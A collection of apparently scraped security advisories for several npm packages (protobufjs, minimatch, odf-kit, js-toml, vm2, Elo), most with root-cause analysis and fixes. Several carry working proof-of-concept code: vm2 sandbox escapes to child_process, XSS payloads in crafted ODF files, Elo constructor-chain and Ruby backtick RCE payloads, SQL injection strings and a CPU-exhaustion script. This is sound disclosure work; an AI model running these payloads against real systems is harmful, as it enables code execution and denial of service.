items.content_html:
Summary

protobufjs could execute generated JavaScript code derived from protobuf schema metadata. When loading a crafted JSON descriptor, schema-controlled type names and type references could reach runtime code generation without sufficient validation.

Impact

An attacker who can provide a malicious protobuf definition or JSON descriptor to an application may be able to execute arbitrary JavaScript in the context of the process using protobufjs.

This requires control over the protobuf schema or descriptor being loaded. Applications that only decode messages using trusted, application-defined schemas are not directly affected by this issue.

Preconditions

  • The application must allow an attacker to control or influence a protobuf definition or JSON descriptor.
  • The application must load that definition through protobufjs reflection APIs such as descriptor loading.
  • The affected generated-code path must be reached, for example by performing an operation on the loaded type.

Workarounds

Do not load protobuf definitions or JSON descriptors from untrusted sources with affected versions. If untrusted schemas must be accepted, validate or restrict them before loading and run schema processing in an isolated environment.

Impact

In affected configurations, client upload access does not consistently align with the associated collection’s access configuration.

You are affected if:

  • You use client uploads with @payloadcms/storage-vercel-blob.
  • Authenticated users can access the client-upload route.

Applications that do not enable client uploads are not affected.

Patches

Client uploads now require authentication and the appropriate collection-level access before upload access is granted.

Users should upgrade Payload packages to >= 3.90.0 or >= 4.0.0-canary.34.

Workarounds

Upgrading to a patched version is recommended. Until you can upgrade, disable client uploads or configure the upload route’s access control to enforce the associated collection’s permissions.

items.content_html:
minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.

researcher: Reid Downing (b1nv0id) files:

  • src/index.ts: 690-770
  • src/index.ts: 780-796

issue: input-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.

the **/../ transformation clones a globparts entry and appends the clone to the same globparts array:

parts.splice(gs, 1)
const other = parts.slice(0)
other[gs] = '**'
globParts.push(other)

this occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.

the expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:

for (let i = 0; i < globParts.length - 1; i++) {
  for (let j = i + 1; j < globParts.length; j++) {
    this.partsMatch(...)
  }
}

an attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.

References

  • https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249
  • https://nvd.nist.gov/vuln/detail/CVE-2026-118764

items.content_html:
Summary

ODF style attribute values are interpolated into style="..." attributes without HTML-escaping in both of odf-kit's to-HTML renderers (odtToHtml and odsToHtml). A double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary HTML/attribute injection — and therefore script execution (XSS) — from a crafted .odt or .ods file wherever the rendered output is inserted as HTML, which is the documented purpose of both functions.

Details

ODT renderer (src/odt/to-html/html-renderer.ts)

The renderer has an escapeHtml() helper and applies it consistently to text content and to attribute values — href, src, alt, id, data-author, data-date, citation text all go through it. The inline CSS strings do not.

In renderTextSpan (dist/odt/to-html/html-renderer.js:195):

const css = spanStyleToCss(span.style);
if (css)
    html = `<span style="${css}">${html}</span>`;

The value of e.g. fo:color is copied from the document into style.fontColor verbatim by the parser (extractSpanStyle, read/parser.js:348), then concatenated raw into the attribute. A " in the value terminates the attribute early.

The same unescaped style="${...}" pattern appears at roughly ten other emission sites: paragraph and heading (paragraphStyleToCss), table cells and rows (cellStyleToCss, rowStyleToCss), <col>, and the image style attribute. The affected source attributes include fo:color, fo:background-color, fo:text-shadow, fo:letter-spacing, fo:font-family (via both direct and font-face resolution), fo:margin-*, fo:padding-*, fo:line-height, fo:border*, and style:vertical-align.

ODS renderer (src/ods/to-html/html-renderer.ts) — same bug

buildInlineStyle() assembles the CSS string from cell formatting properties — fo:color, fo:font-size, fo:font-family, fo:background-color, fo:text-align, etc. — with zero escapeHtml calls, and renderCell emits it raw (line 65):

if (includeStyles && cell.formatting) {
    const style = buildInlineStyle(cell.formatting);
    if (style) attrs.push(`style="${style}"`);
}

Additionally, row.height (from style:row-height) goes raw into the row element (line 95):

const style = includeStyles && row.height ? ` style="height:${row.height}"` : "";
return `<tr class="${prefix}-row"${style}>${cells}</tr>`;

The same injection is reachable through the public odf-kit/ods/to-html export (odsToHtml()), so both to-HTML directions are affected.

Version scope

The odt/to-html and ods/to-html modules first shipped in 0.14.0; the current latest release is 0.14.1. The PoCs were re-ran against the unreleased main branch (commit 270a361) — both injections still fire, so no fix has landed past the release.

PoC

Each PoC is a minimal ODF package (mimetype + META-INF/manifest.xml + content.xml) whose content.xml contains exactly one poisoned automatic style. The files are generated by this short Python script (stdlib only, no dependencies) — save as build-pocs.py and run python3 build-pocs.py:

import zipfile

def build(path, mimetype, content):
    # ODF requires 'mimetype' first and stored uncompressed
    with zipfile.ZipFile(path, "w") as z:
        z.writestr(zipfile.ZipInfo("mimetype"), mimetype, compress_type=zipfile.ZIP_STORED)
        z.writestr("META-INF/manifest.xml",
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">\n'
            ' <manifest:file-entry manifest:full-path="/" manifest:media-type="' + mimetype + '"/>\n'
            ' <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>\n'
            '</manifest:manifest>\n')
        z.writestr("content.xml", content)

ODT = "application/vnd.oasis.opendocument.text"
ODS = "application/vnd.oasis.opendocument.spreadsheet"
HEAD = ('<?xml version="1.0" encoding="UTF-8"?>\n'
        '<office:document-content\n'
        ' xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"\n'
        ' xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"\n'
        ' xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0"\n'
        ' xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0">')

Q = """
p1 = f"red{Q} onmouseover={Q}alert(1){Q} x={Q}"                       # attribute injection
p2 = f'red{Q}><img src=x onerror={Q}alert(1){Q}><x style={Q}'  # full markup injection

# .odt: one paragraph with a poisoned automatic text style
def odt(p):
    return (HEAD + '\n<office:automatic-styles>\n'
        ' <style:style style:family="paragraph" style:name="P1">\n'
        f'  <style:text-properties fo:color="{p}"/>\n'
        ' </style:style>\n</office:automatic-styles>\n'
        '<office:body><office:text><text:p text:style-name="P1">hello</text:p>'
        '</office:text></office:body></office:document-content>\n')

# .ods: one cell with a poisoned automatic cell style
def ods(p):
    return (HEAD + '\n<office:automatic-styles>\n'
        ' <style:style style:family="table-cell" style:name="ce1">\n'
        f'  <style:text-properties fo:color="{p}"/>\n'
        ' </style:style>\n</office:automatic-styles>\n'
        '<office:body><office:spreadsheet><table:table table:name="Sheet1"'
        ' xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0">'
        '<table:table-row><table:table-cell table:style-name="ce1" office:value-type="string">'
        '<text:p>hello</text:p></table:table-cell></table:table-row>'
        '</table:table></office:spreadsheet></office:body></office:document-content>\n')

build("poc1.odt", ODT, odt(p1))
build("poc2.odt", ODT, odt(p2))
build("poc3.ods", ODS, ods(p2))

This produces poc1.odt, poc2.odt and poc3.ods. The only attacker-controlled input is the fo:color value on the style — for poc1 it reads, as stored in content.xml:

<style:text-properties fo:color="red" onmouseover="alert(1)" x=""/>

poc1.odt — attribute injection (ODT). The fo:color value (unescaped) is:

red" onmouseover="alert(1)" x="

(encoded as " in the XML). Output of odtToHtml(bytes, { fragment: true }):

<p><span style="color:red" onmouseover="alert(1)" x="">hello</span></p>

The quote breaks out of style, and onmouseover becomes a real attribute on the span.

poc2.odt — full markup injection (ODT). The style value is:

red"><img src=x onerror="alert(1)"><x style="

Output:

<p><span style="color:red"><img src=x onerror="alert(1)"><x style="">hello</span></p>

poc3.ods — same injection via the ODS renderer. A crafted .ods whose cell automatic style carries a poisoned fo:color value (same payload as poc2). Output of odsToHtml(bytes):

<tr class="ods-row"><td class="ods-cell" style="color:red"><img src=x onerror="alert(1)"><x style="">hello</td></tr>

Reproduction script:

import { readFileSync } from 'fs';
import { odtToHtml } from 'odf-kit/odt/to-html';
import { odsToHtml } from 'odf-kit/ods/to-html';

const bytes = (p) => new Uint8Array(readFileSync(p));

console.log(odtToHtml(bytes('poc2.odt'), { fragment: true }));
console.log(odsToHtml(bytes('poc3.ods')));

This was found while auditing ODT import paths in a web application that uses odf-kit as its converter. That application happens to sanitize the output downstream, so minimal standalone reproductions were built against the published odf-kit 0.14.1 package directly in Node.

Impact

Any consumer that renders odtToHtml() or odsToHtml() output as HTML — which is both functions' documented purpose — gets XSS from a crafted .odt/.ods file they convert. Untrusted file → arbitrary tags and attributes → script execution in the host page with the page's origin. The fragment mode ({ fragment: true }) is equally affected. The header comment in the ODT renderer currently promises "the output is safe to embed in any context", so consumers may reasonably be relying on that today.

For what it's worth, the sibling paths were checked: the markdown direction does not reach this code, and escapeHtml is correctly applied everywhere else I looked in the ODT renderer. The ODS renderer initially appeared clean too, but the buildInlineStyle path above is the second instance of the same defect.

Suggested fix

Escape the assembled CSS string at every style="${...}" site, in both renderers:

html = `<span style="${escapeHtml(css)}">${html}</span>`

(or, stronger, validate/allowlist the parsed style values at parse time — they are all supposed to be color literals, lengths, or keywords, so a strict per-property format check would also work; escaping row.height in the ODS renderer at line 95 as well). The per-site escape is the minimal fix consistent with the rest of the ODT file.

References

  • https://github.com/GitHubNewbie0/odf-kit/security/advisories/GHSA-3cgg-c5pp-57h6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-113787
  • https://github.com/GitHubNewbie0/odf-kit/commit/fa3abc5a7a757f56c7212b2dbe99d1d2db995420
  • https://github.com/GitHubNewbie0/odf-kit/releases/tag/v0.14.2
  • https://github.com/advisories/GHSA-3cgg-c5pp-57h6

items.content_html:
Summary

js-toml versions up to and including 1.1.0 parse hexadecimal / octal / binary integer literals via a hand-written parseBigInt loop that multiplies a BigInt accumulator by the radix once per input digit. Each iteration performs a BigInt * BigInt operation on an accumulator that grows linearly with the number of digits already consumed, so the whole loop is O(n²) in the literal length. The lexer regex places no upper bound on the literal length, so a single TOML document containing one 500 kB hex literal pins one CPU core for **40 seconds** on a modern laptop (Apple M-series, Node v22). Memory amplification is bounded but CPU amplification is severe and grows quadratically: doubling the literal length quadruples the work.

A caller that invokes load() on attacker-controlled TOML (configuration upload endpoints, CI/CD systems ingesting third-party *.toml, IDE plugins, build tools) is exposed to a single-request CPU exhaustion DoS.

CWE-1333 (Inefficient Regular Expression Complexity → here, inefficient parser complexity), CWE-400 (Uncontrolled Resource Consumption), CWE-407 (Inefficient Algorithmic Complexity).

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H = 7.5 (HIGH) when the parser is invoked on attacker-controllable input; LOW when the calling application restricts TOML input size to small documents (< 1 kB).

Affected

  • Package: js-toml (npm)
  • Versions: >= 0.0.0, <= 1.1.0 (all released versions up to and including the current 1.1.0)
  • Affected entry point: load() exported from the package root

Vulnerable code

src/load/tokens/NonDecimalInteger.ts lines 54-84 at SHA-pinned 2470ebf2e9009096aa4cbd1a15e574c54cc36b1a:

const parseBigInt = (string: string, radix: number): bigint => {
  let result = BigInt(0);
  for (let i = 0; i < string.length; i++) {
    const char = string[i];
    const digit = parseInt(char, radix);
    result = result * BigInt(radix) + BigInt(digit);
  }

  return result;
};

and the interpreter that dispatches to it at lines 72-84:

registerTokenInterpreter(NonDecimalInteger, (raw: string) => {
  const intString = raw.replace(/_/g, '');
  const digits = intString.slice(2);
  const radix = getRadix(raw);

  const int = parseInt(digits, radix);

  if (Number.isSafeInteger(int)) {
    return int;
  }

  return parseBigInt(digits, radix);
});

Two compounding problems:

  1. Algorithmic: the loop performs result * BigInt(radix) + BigInt(digit) once per input digit. After i iterations result has O(i) limbs, so the multiply costs O(i). Summed over n digits the total cost is O(n²).

  2. No length guard: the lexer regex at src/load/tokens/NonDecimalInteger.ts#L14-L46 is 0x<hexDigit>(<hexDigit>|_<hexDigit>)* (likewise for 0o / 0b). The literal length is bounded only by the input document size. There is no maxNumberLength / maxLiteralLength option, no chevrotain-level cutoff, and no validation at the interpreter callsite.

By contrast, the DecimalInteger token interpreter at src/load/tokens/DecimalInteger.ts#L12-L19 uses the V8 native BigInt(intString) constructor, which is O(n) and runs in single-digit milliseconds for inputs that take 40 seconds via the hand-written radix loop.

Impact

A single attacker-supplied TOML document containing one ~500 kB radix-prefixed integer literal pins one CPU core for ~40 seconds on a modern laptop. Doubling the literal length quadruples the work. With 8 MB of input the parse would block the event loop for many minutes of CPU. In a typical Node.js single-thread process this blocks all concurrent request handling for the duration. The defect is exploitable on any code path that calls load() (the only documented entry point) on attacker-controlled or third-party TOML.

Reachability

The vulnerable path is the default code path for load(). No options or configuration are required to trigger it. Any caller that exposes load() to attacker-controlled or third-party TOML input reaches it on the first hex / octal / binary literal whose value exceeds Number.MAX_SAFE_INTEGER (i.e. more than 13 hex digits, 18 octal digits, or 53 binary digits).

Realistic exposure surfaces:

  • Web service that accepts a user-supplied TOML configuration (settings import, theme upload, deployment manifest).
  • CI / CD or build tool that runs js-toml on TOML in third-party repositories or pull requests.
  • IDE / language-server plugin that re-parses a TOML buffer on every keystroke.
  • Multi-tenant SaaS that lets one tenant submit TOML processed by a shared worker.

PoC (End-to-end reproduction)

Environment

  • Node.js v22.x (tested on v22.0.0 and Node v26.0.0)
  • macOS arm64 / Linux x86_64 (CPU exhaustion is hardware-independent; absolute timings will scale by CPU clock)

Install

mkdir js-toml-cve && cd js-toml-cve
npm init -y
npm install js-toml@1.1.0 @iarna/toml

poc_full_e2e.mjs

import { load } from 'js-toml';
import iarna from '@iarna/toml';

function timeIt(label, fn) {
  const t0 = process.hrtime.bigint();
  let result, err;
  try { result = fn(); } catch (e) { err = e; }
  const t1 = process.hrtime.bigint();
  const ms = (Number(t1 - t0) / 1e6).toFixed(1);
  if (err) console.log(`${label}: ERROR ${err.message} after ${ms}ms`);
  else     console.log(`${label}: ${ms}ms${result ? ' ' + result : ''}`);
}

console.log('--- Sanity baseline (small inputs) ---');
timeIt('decimal int 1', () => { load('x = 1'); return ''; });
timeIt('hex 0x10',      () => { load('x = 0x10'); return ''; });
timeIt('hex 0xffff',    () => { load('x = 0xffff'); return ''; });

console.log('\n--- Amplification curve: js-toml.load() with 0x<N hex digits> ---');
for (const n of [10_000, 20_000, 50_000, 100_000, 200_000, 500_000]) {
  const hexDigits = 'f'.repeat(n);
  const tomlText  = `x = 0x${hexDigits}`;
  timeIt(`hex ${n.toLocaleString()} digits (${tomlText.length} bytes input)`,
    () => {
      const r = load(tomlText);
      return `bits=${r.x.toString(2).length}`;
    });
}

console.log('\n--- Negative control: same input via @iarna/toml ---');
for (const n of [10_000, 50_000, 100_000, 200_000]) {
  const hexDigits = 'f'.repeat(n);
  const tomlText  = `x = 0x${hexDigits}`;
  timeIt(`@iarna/toml hex ${n.toLocaleString()} digits`,
    () => {
      const r = iarna.parse(tomlText);
      return `type=${typeof r.x}`;
    });
}

console.log('\n--- Octal / binary share the same code path ---');
for (const n of [50_000, 100_000]) {
  const octDigits = '7'.repeat(n);
  const binDigits = '1'.repeat(n);
  timeIt(`oct 0o${n.toLocaleString()} digits`,
    () => { const r = load(`x = 0o${octDigits}`); return `bits=${r.x.toString(2).length}`; });
  timeIt(`bin 0b${n.toLocaleString()} digits`,
    () => { const r = load(`x = 0b${binDigits}`); return `bits=${r.x.toString(2).length}`; });
}

Captured run output (unpatched js-toml@1.1.0, Node v26.0.0, Apple M-series)

# js-toml version: 1.1.0

--- Sanity baseline (small inputs) ---
decimal int 1: 1.3ms
hex 0x10: 0.4ms
hex 0xffff: 0.1ms

--- Amplification curve: js-toml.load() with 0x<N hex digits> ---
hex 10,000 digits (10006 bytes input): 15.0ms bits=40000
hex 20,000 digits (20006 bytes input): 29.8ms bits=80000
hex 50,000 digits (50006 bytes input): 214.7ms bits=200000
hex 100,000 digits (100006 bytes input): 693.0ms bits=400000
hex 200,000 digits (200006 bytes input): 3239.6ms bits=800000
hex 500,000 digits (500006 bytes input): 40388.3ms bits=2000000

--- Negative control: same input via @iarna/toml ---
@iarna/toml hex 10,000 digits: 2.3ms type=bigint
@iarna/toml hex 50,000 digits: 3.2ms type=bigint
@iarna/toml hex 100,000 digits: 5.4ms type=bigint
@iarna/toml hex 200,000 digits: 10.2ms type=bigint

--- Octal / binary share the same code path ---
oct 0o50,000 digits: 187.6ms bits=150000
bin 0b50,000 digits: 49.5ms bits=50000
oct 0o100,000 digits: 633.2ms bits=300000
bin 0b100,000 digits: 196.8ms bits=100000

Confirmation points:

  • Quadratic curve: 10k → 20k digits is ~2x time (15ms → 30ms); 100k → 200k is ~4.7x time (693ms → 3239ms); 200k → 500k (2.5x) is ~12x time (3.2s → 40s). Matches the predicted O(n²).
  • Single ~500 kB document blocks the event loop for ~40 s of CPU time.
  • Octal and binary literals trigger the same path through parseBigInt(digits, 8) and parseBigInt(digits, 2).
  • The negative control (@iarna/toml, which calls the V8 native BigInt(value) constructor) parses the same inputs in 2-10 ms. The defect is in js-toml's hand-written radix conversion, not in V8 BigInt semantics or in the input size itself.

Patched-build verification

After applying the fix (replace parseBigInt(digits, radix) with BigInt('0' + raw[1] + digits) and add a maxLiteralLength guard at the interpreter callsite), the same PoC produces:

--- Amplification curve: js-toml.load() with 0x<N hex digits> ---
hex 10,000 digits: 0.2ms bits=40000
hex 20,000 digits: 0.3ms bits=80000
hex 50,000 digits: 0.7ms bits=200000
hex 100,000 digits: 1.5ms bits=400000
hex 200,000 digits: 2.8ms bits=800000
hex 500,000 digits: 7.1ms bits=2000000

(Linear scaling, sub-10 ms even on inputs five orders of magnitude larger than any realistic literal.) With a 1000-digit cap applied at the interpreter callsite, literals beyond the cap raise SyntaxParseError instead of being parsed at all, matching the maxNumberLength convention used by jackson-core StreamReadConstraints and gson NumberLimits.

Suggested fix

Two changes, both in src/load/tokens/NonDecimalInteger.ts:

  1. Replace the hand-written parseBigInt loop with the V8 native BigInt(prefixedString) constructor. BigInt natively accepts the 0x / 0o / 0b prefix and parses in O(n):

    registerTokenInterpreter(NonDecimalInteger, (raw: string) => {
  const intString = raw.replace(/_/g, '');
  const digits = intString.slice(2);
  const radix = getRadix(raw);

  // Optional but recommended: cap the literal length to avoid degenerate inputs
  const MAX_RADIX_LITERAL_LENGTH = 1000;
  if (digits.length > MAX_RADIX_LITERAL_LENGTH) {
    throw new SyntaxParseError(
      `Radix-prefixed integer literal exceeds ${MAX_RADIX_LITERAL_LENGTH} digits`
    );
  }

  const int = parseInt(digits, radix);
  if (Number.isSafeInteger(int)) {
    return int;
  }

  // BigInt accepts '0x'/'0o'/'0b' prefix natively
  return BigInt(intString);
});

  2. Delete the parseBigInt helper. The native constructor handles all three radices.

Either change alone fixes the worst-case wall-clock. The combination matches the constraint posture of jackson-core (StreamReadConstraints.validateIntegerLength) and gson (NumberLimits.checkNumberStringLength).

items.content_html:
Summary

VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

Details

The __lookupGetter__ method allows to read the getter of an object. It is special in VM2 since it will switch between the host and sandbox version of the method when passed to the other context. This allows to access getters on an object in the host context if the method is called from the host context which can be achieved by using the host apply method which can be accessed through Buffer.apply. Afterwards, this function can be used to call the host version of __lookupGetter__ with Buffer and __proto__ resulting in the prototype lookup method from the host context. With this method the hosts Function.prototype object can be retrieved and the host Function acquired through the constructor property which allows to create and run code in the host context. This issue was attempted to be fixed with https://github.com/patriksimek/vm2/blob/4b009c2d4b1131c01810c1205e641d614c322a29/lib/bridge.js#L427. However, this can be circumvented by using Object.getOwnPropertyDescriptor to get the constructor property.

PoC

The following code demonstrates this issue by acquiring the host process object and executing touch pwned.

const {VM} = require("vm2");
const vm = new VM();
vm.run(`
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
Object.getOwnPropertyDescriptor(p.call(a),'constructor').value('return process')().mainModule.require('child_process').execSync('touch pwned');
`);

Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.

Summary

VM2 suffers from a sandbox breakout vulnerability through the inspect function. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

Details

The node inspect method allows to log details of objects. To get to the details, the implementation unwraps proxies. The unwrapped values can be extracted using the this.seen of the stylize function. This allows to get access to the internal proxy handler of VM2 which contains the sandbox object. Since the access to the handler is itself wrapped by a VM2 proxy, accessing the sandbox object in the proxy handler will result in a wrapped sandbox object given into the sandbox. This allows to write a wrapped host object to the wrapped sandbox object and read the raw host object from the raw sandbox object bypassing the proxy bridge.

PoC

const obj = {
    subarray: Buffer.prototype.inspect,
    slice: Buffer.prototype.slice,
    hexSlice:()=>'',
    l:{__proto__: null}
};

obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
    if (this.seen?.[1]?.objectWrapper) this.seen[1].objectWrapper().x = obj.slice;
    return a;
}});
obj.l.x.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');

Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.

items.content_html:
Summary

An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — defaultFormats.elo.parse(), the bin/elo CLI, or the live browser playground at elo-lang.org/try — can execute arbitrary code in the host JavaScript runtime. A payload built from the .constructor.constructor chain compiles, without modification, to a live Function invocation in the emitted JavaScript, escaping any sandbox assumption around "Elo is a safe data/DSL language."

Vulnerable sink and root cause

Three interacting sites in src/ produce the bug at commit 749af7b:

  1. src/transform.ts:144–158 — the member_access handler allows access on types any, object, or array without filtering the property name. This is the only place an integrator could have plugged a denylist.
  2. src/compilers/javascript.ts:210 — the JS emitter writes ${objectExpr}.${ir.property} verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript.
  3. src/parser.ts:163–170, 748–750 — the parser accepts constructor (and other JS meta-property names) as an ordinary identifier, so .constructor clears type-checking without triggering any warning.

Combined, the Elo expression ({}).constructor.constructor('…')() compiles to a live Function('…')() call in the emitted JS, executing in the realm of whichever sink runs the compiled code.

Attack surfaces

All three surfaces share the same root cause (no denylist in transform.ts) and are addressed by the same one-file patch:

# Entry point Threat model
1 Browser playground — https://elo-lang.org/try/?code=…&run=1 0-click XSS / account takeover against elo-lang.org. ?run=1 triggers setTimeout(() => this.run(), 100) in playground_controller.ts:531; the server issues a 301 that preserves ?code=. Any shared URL that contains a payload compromises the visitor's session on elo-lang.org.
2 bin/elo CLI RCE on CI / DevOps hosts. Both node bin/elo payload.elo and node bin/elo -e "_" -d @payload.elo -f elo fire. The -f elo path is especially severe: the flag exists to pass user-supplied files as data into an Elo pipeline. No integrator expects a data-format flag to shell out to /usr/bin/id.
3 Library API — defaultFormats.elo.parse() Node.js RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases).

Proof of Concept

Common payload (works on all three entry points):

({}).constructor.constructor('return this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\').toString()')()

Library API — poc-minimal.js:

// npm install elo
const { defaultFormats } = require('elo');

const payload = "({}).constructor.constructor('return this.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()')()";

console.log(defaultFormats.elo.parse(payload));
// → uid=1000(ultrasupara) gid=1000(ultrasupara) groups=…

CLI — poc-cli.sh:

node bin/elo payload.elo
# uid=1000(ultrasupara)…

node bin/elo -e "_" -d @payload.elo -f elo
# uid=1000(ultrasupara)…

Browser playground — 0-click XSS URL:

https://elo-lang.org/try/?code=%28%7B%7D%29.constructor.constructor%28%27alert%28document.domain%29%27%29%28%29&run=1

Opening this URL causes alert(document.domain) to fire automatically after ~100 ms with no user interaction beyond navigating to the link. The 301 redirect preserves the ?code= parameter intact. End-to-end execution on the live production site was captured in a screen recording attached to the original report.

Independence from GHSA #3 (AST-API injection)

This finding is independent of the Medium-severity AST-API report (GHSA #3). That fix's identifier regex ^[a-zA-Z_][a-zA-Z0-9_]*$ happens to accept constructor, and its threat model requires an attacker-controlled AST object rather than a plain string. The current finding requires only a plain Elo string, which is a strictly weaker attacker model.

References

  • https://github.com/enspirit/elo/security/advisories/GHSA-33r5-xmm8-v6x5
  • https://github.com/advisories/GHSA-33r5-xmm8-v6x5
items.title: [@enspirit/elo] Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access

items.content_html:
Summary

Elo's Ruby backend emits attacker-controlled text into Ruby double-quoted strings without escaping the # character. Because # begins Ruby's interpolation sequences — #{expr}, #@ivar, #@@cvar, #$gvar — and any expression wrapped in #{...} may use backticks for shell execution, an Elo program that contains a crafted string literal or a labelled subtype constraint compiles to Ruby that evaluates attacker-chosen Ruby, and through backticks runs attacker-chosen shell commands, at runtime.

The same Elo source compiled to JavaScript, Python, or SQL is benign, so the bug also breaks the cross-target portability guarantee the rest of the compiler honours.

Vulnerable sinks

Two sinks exist in src/compilers/ruby.ts at commit 749af7b:

  1. String-literal emitter — lines 180–184. The emitter escapes backslash, double quote, and control characters, but not #. Any #{...} sequence in an Elo string literal flows straight into the emitted Ruby source.

  2. Labelled subtype-constraint branch — lines 405–412. The error message passed to p_fail(p, "...") is wrapped in a Ruby double-quoted string with no escape pass at all. Because the parser at src/parser.ts:1339–1348 accepts single-quoted Elo strings as constraint labels, a label such as '#{ `id` }' flows unchanged into the emitted Ruby.

Attack surfaces

All three surfaces share the same root cause (the missing # escape in the Ruby double-quoted-string emission path) and are addressed by the same patch:

# Entry point Threat model
1 /try playground on elo-lang.org (Ruby target) 0-click server-side RCE against elo-lang.org infrastructure from a shared PoC URL
2 bin/eloc -t ruby -x on a CI or DevOps host RCE on any host that passes Elo strings through the CLI
3 Library API — defaultFormats.elo.parse() with a Ruby emission step Ruby RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases)

Proof of Concept

String-literal sink:

# poc.elo
'RES=#{`id 2>&1`}'

$ eloc -t ruby -x poc.elo
# emitted Ruby contains:  "RES=#{`id 2>&1`}"
# running it returns the output of id(1).

Replacing `id 2>&1` with `touch /tmp/pwned` produces a trivially observable filesystem side effect.

Subtype-constraint label sink:

# poc-subtype.elo
let X = Int(i | '#{`touch /tmp/pwned2`}': i > 0) in X(-1)

The predicate fails for -1, causing p_fail(p, "#{...}") to interpolate and execute the backtick command at the Ruby layer.

Both flows are automated in the reproduction script submitted with the original report and were verified against Ruby 3.x.

Root cause

The Ruby-emitter's double-quoted-string escape routine omitted # from its character set, and one emission path (the subtype-constraint label branch) performed no escape pass at all.

items.title: [@enspirit/elo] Elo Ruby backend has Remote Code Execution via unescaped `#{...}` interpolation in emitted string literals and subtype-constraint labels

items.content_html:
Summary

Elo's programmatic AST API accepts arbitrary values in many node fields without runtime type or syntax validation. Each backend's emit stage interpolates those values straight into the generated source with no escape pass. An integrator that populates the AST from JSON-deserialised input, plugin output, or any other untyped source therefore exposes a code-injection primitive that flows through to the emitted JavaScript, Ruby, Python, or SQL.

The same pattern was previously addressed in 0.9.7 (2026-01-27), which patched the date/datetime/duration literal emitters via JSON.stringify() after a report by naoyashiga. This advisory generalises that fix to the remaining AST surface — at least 23 emission sites across six node-field categories and four backends.

Vulnerable sinks

Each row is a category of sinks that share the same shape: TypeScript signature erased at runtime → AST-API consumer passes a crafted value → emit interpolates the value verbatim.

# AST field Affected backends Resulting injection
1 int_literal / float_literal .value JS, Ruby, Python, SQL Arbitrary expression in the emitted numeric position (RCE on JS/Ruby/Python; SQL expression injection)
2 variable.name JS, Ruby, Python, SQL Identifier-position injection; on SQL, raw SQL injection because undefined identifiers are intentionally emitted as column references
3 member_access.property JS, Ruby, Python, SQL Property access escaped into expression (RCE)
4 object_literal key JS, Ruby, SQL Computed-key / extra-property injection (RCE on JS/Ruby; SQL injection)
5 datapath segment JS, Ruby, Python, SQL Ruby symbol-list injection allows backtick shell exec; SQL string-segment unquoted in single-quote context allows SQL injection
6 lambda.params[].name JS, Ruby, Python Parameter-list structural injection (RCE)
7 SQL let binding name SQL Identifier injection in … AS <name> clause

Proof of Concept

End-to-end execution was verified at commit 749af7b for representative cases per backend. Examples:

Numeric literal injection (all four backends). Feeding the following AST through compileToJavaScript emits a live console.log on call:

{ type: 'literal', value: "(console.log('PWN_INT_JS'),1)" }
// emits: (function(_) { return (console.log('PWN_INT_JS'),1); })(null);

The same AST against Ruby with "(system('touch /tmp/pwn_int_ruby'); 1)" creates the file; Python with "(print('PWN_INT_PY') or 1)" prints the sentinel; SQL emits the raw string into the numeric position.

SQL variable.name injection:

{ type: 'variable', name: "1; DROP TABLE users; --" }
// emits: 1; DROP TABLE users; --

Ruby datapath segment shell-exec:

{ type: 'datapath', segments: ["a, system(`touch /tmp/pwn_dp_ruby`)"] }
// emits: [:a, system(`touch /tmp/pwn_dp_ruby`)]

All ten end-to-end cases are automated in the ast-exec.js / ast-exec2.js scripts attached to the original report; each console.log and sentinel file was observed.

Independence from GHSA #2

This finding is independent of GHSA #2 (the .constructor.constructor sandbox escape). That report covers payloads delivered as plain Elo strings through the parser; the present advisory covers payloads delivered as AST objects through the programmatic API. The two threat models do not overlap: GHSA #2's identifier regex ^[a-zA-Z_][a-zA-Z0-9_]*$ accepts constructor (and is the right behaviour for a parser), while the present advisory adds runtime validation at every backend emit site so that AST-API consumers cannot inject arbitrary text into emitted source.
